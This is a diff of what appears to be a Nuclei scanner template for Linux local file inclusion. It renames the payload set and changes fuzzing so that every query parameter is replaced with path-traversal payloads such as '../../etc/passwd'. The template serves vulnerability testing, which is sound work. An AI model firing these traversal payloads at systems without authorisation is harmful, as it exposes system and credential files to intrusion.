@@ -1,4 +1,4 @@
-id: lfi-linux
+id: linux-lfi-fuzz
 
 info:
   name: Local File Inclusion - Linux
@@ -7,7 +7,7 @@ info:
   reference:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
     - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
-  tags: lfi,dast
+  tags: lfi,dast,linux
 
 requests:
   - method: GET
@@ -15,7 +15,7 @@ requests:
       - '{{BaseURL}}'
 
     payloads:
-      escape:
+      nix_fuzz:
         - '/etc/passwd'
         - '../../etc/passwd'
         - '../../../etc/passwd'
@@ -65,10 +65,10 @@ requests:
 
     fuzzing:
       - part: query
-        type: postfix
-        mode: single
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
         fuzz:
-          - '{{escape}}'
+          - '{{nix_fuzz}}'
 
     stop-at-first-match: true
     matchers:
